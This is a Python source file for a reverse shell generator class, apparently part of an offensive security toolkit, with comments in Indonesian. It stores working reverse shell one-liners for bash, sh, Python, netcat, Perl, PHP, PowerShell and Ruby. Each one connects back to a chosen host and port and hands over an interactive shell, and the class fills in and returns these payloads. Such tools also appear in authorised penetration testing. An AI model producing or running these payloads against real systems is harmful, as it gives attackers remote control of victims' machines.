"""Reverse Shell Generator Tool"""
from typing import Dict, Any

from ...core.base_tool import BaseTool, ToolMetadata, ToolCategory
from ...core.logger import logger


class ReverseShellGenerator(BaseTool):
    """Reverse shell generator untuk generate berbagai reverse shell payloads"""
    
    def __init__(self):
        metadata = ToolMetadata(
            name="Reverse Shell Generator",
            category=ToolCategory.UTILITIES,
            version="1.0.0",
            author="deltaastra24@gmail.com",
            description="Reverse shell generator untuk generate berbagai reverse shell payloads",
            usage="gen = ReverseShellGenerator(); gen.run(host='10.0.0.1', port=4444, language='bash')",
            requirements=[],
            tags=["utilities", "payload", "reverse-shell", "exploitation"]
        )
        super().__init__(metadata)
        
        self.shell_templates = {
            'bash': 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
            'sh': 'sh -i >& /dev/tcp/{host}/{port} 0>&1',
            'python': 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{host}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
            'python3': 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{host}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"',
            'nc': 'nc -e /bin/sh {host} {port}',
            'perl': 'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
            'php': 'php -r \'$sock=fsockopen("{host}",{port});$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\'',
            'powershell': '$client = New-Object System.Net.Sockets.TcpClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
            'ruby': 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{host}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
        }
    
    def validate_input(self, host: str, port: int, language: str = 'bash', **kwargs) -> bool:
        """Validate input"""
        if not host:
            self.add_error("Host tidak boleh kosong")
            return False
        
        if port < 1 or port > 65535:
            self.add_error("Port harus antara 1-65535")
            return False
        
        if language not in self.shell_templates:
            self.add_error(f"Language {language} tidak didukung")
            return False
        
        return True
    
    def generate_shell(self, host: str, port: int, language: str) -> str:
        """Generate reverse shell payload"""
        template = self.shell_templates.get(language)
        if template:
            return template.format(host=host, port=port)
        return None
    
    def run(self, host: str, port: int, language: str = 'bash', all_shells: bool = False, **kwargs):
        """Generate reverse shell payloads"""
        if not self.validate_input(host, port, language, **kwargs):
            return
        
        self.is_running = True
        self.clear_results()
        
        try:
            logger.info(f"Generating reverse shell payloads")
            
            result = {
                'host': host,
                'port': port,
                'payloads': {}
            }
            
            if all_shells:
                # Generate untuk semua shell types
                for lang in self.shell_templates.keys():
                    payload = self.generate_shell(host, port, lang)
                    result['payloads'][lang] = payload
                    self.add_result({'language': lang, 'payload': payload})
            else:
                # Generate untuk shell tertentu
                payload = self.generate_shell(host, port, language)
                result['payloads'][language] = payload
                self.add_result({'language': language, 'payload': payload})
            
            logger.info("Reverse shell generation completed")
            return result
            
        except Exception as e:
            self.add_error(f"Shell generation failed: {e}")
        finally:
            self.is_running = False
